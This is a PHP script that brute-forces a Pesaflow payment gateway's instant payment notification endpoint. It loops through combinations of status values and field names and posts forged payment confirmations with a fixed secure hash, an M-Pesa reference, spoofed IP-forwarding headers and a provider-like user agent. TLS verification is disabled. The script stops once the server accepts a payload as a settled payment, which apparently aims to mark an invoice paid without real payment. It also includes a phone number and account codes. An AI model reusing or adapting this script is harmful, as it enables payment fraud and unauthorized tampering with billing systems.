<?php
//die('This file is not meant to be accessed directly.');

$url = "https://nairobi.pesaflow.com/payment/6618c431-7d6b-4743-94ed-8bf17c852239/40/ipn";

$status_load = [
    'settled',
    'pending',
    'failed',
    'true',
    'false',
    '2',
    'success',
    'completed',
    'cancelled',
    1,
    2,
    3,
];

$invoice_number_load = [
    'invoice_number',
    'invoiceNumber',
    'reference',
    'invoice',
    'InvoiceNumber',
    'Invoice',
    'InvoiceNo',
    'Invoice_Number',
    'invoiceNo',
];

$amount_paid_load = [
    'amount_paid',
    'amount',
    'amountPaid',
    'Amount_paid',
    'Amount_Paid',
    'AmountPaid',
    'Amount',
];

$payment_date_load = [
    'payment_date',
    'date',
    'paymentDate',
];


$client_invoice_ref_load = [
    'client_invoice_ref',
    'invoice_ref',
    'billRefNumber',
    'refNumber',
    'bill_ref_number',
    'ref_number',
    'bill_number',
    'reference_number',
    'bill_ref',
    'billRef',
    'invoiceRef',
    'refNumber',
    'invoiceRefNumber',
    'invoice_ref_number',
    'invoiceRefNo',
    'invoice_ref_no',
    'clientInvoiceRef',
    'clientInvoiceRefNo',
    'client_invoice_ref_no',
    'client_invoice_ref_number',
];

foreach ($status_load as $sl) {
    foreach ($invoice_number_load as $inl) {
        foreach ($amount_paid_load as $apl) {
            foreach ($payment_date_load as $pdl) {
                foreach ($client_invoice_ref_load as $cif) {

                    $payload = [
                        "status" => $sl,
                        "secure_hash" => "NTk4NGE3NTIxNjk4OTg2MjhmMWZmMzU4NmU4NDBmYmVlYWVlYTMxN2E1MWMwYzg4MTU3YTBmN2Q0NGQ3ZjUyMA==",
                        "phone_number" => "254792140424",
                        "payment_reference" => [
                            [
                                "payment_reference" => "TF61PE7SBL",
                                "payment_date" => "2025-06-06T07:26:48Z",
                                "inserted_at" => "2025-06-06T04:26:49",
                                "currency" => "KES",
                                "amount" => "2"
                            ]
                        ],
                        $pdl => "2025-06-06 10:26:48+03:00 EAT Africa/Nairobi",
                        "payment_channel" => "MPESA",
                        "last_payment_amount" => "2",
                        $inl => "WD8N5QB",
                        "invoice_amount" => "2.00",
                        "currency" => "KES",
                        $cif => "WD8N5QB",
                        $apl => "2",
                        "account_number" => "AUFBVRC"
                    ];


                    $jsonData = json_encode($payload);

                    $headers = [
                        "Host: nairobi.pesaflow.com",
                        "Accept-Encoding: gzip",
                        "X-Forwarded-Proto: https",
                        "X-Real-IP: 197.248.11.129",
                        "X-Real-Port: 39505",
                        "X-Forwarded-For: 197.248.11.129",
                        "X-Forwarded-Port: 443",
                        "X-Port: 443",
                        "X-LSCACHE: 1",
                        "Content-Length: " . strlen($jsonData),
                        "User-Agent: hackney/1.20.1",
                        "Content-Type: application/json"
                    ];

                    $ch = curl_init($url);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);


                    $response = curl_exec($ch);
                    $info = curl_getinfo($ch);
                    $error = curl_error($ch);
                    curl_close($ch);

                    $dt1 = json_decode($response, true);

                    if (is_array($dt1) && isset($dt1['status']) && $dt1['status'] != 'error') {
                        die("Payment found successfully.\n".json_encode($payload, JSON_PRETTY_PRINT).PHP_EOL);
                    } else {
                        echo "NULL." . $dt1['message'].PHP_EOL;
                    }
                }
            }
        }
    }
}



// Optional output for debugging
echo "Response:\n" . $response . "\n".PHP_EOL;
//echo "Info:\n" . print_r($info, true) . "\n";
echo "Error:\n" . $error . "\n".PHP_EOL;
